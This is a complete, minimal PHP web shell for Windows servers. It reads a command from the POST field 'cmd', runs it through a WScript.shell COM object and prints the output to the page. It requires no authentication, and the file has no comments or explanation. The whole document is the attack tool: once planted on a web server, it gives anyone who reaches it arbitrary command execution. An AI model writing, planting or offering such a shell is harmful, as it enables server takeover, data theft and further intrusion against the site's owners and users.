<?php
$shell = new COM("WScript.shell");
 
$cmd = $_POST['cmd'];
$exe = @$shell->exec("$cmdpath /c ".$cmd); 
$out = $exe->StdOut(); 
$output = $out->ReadAll(); 
echo '<pre>'.$output.'</pre>'; 

?>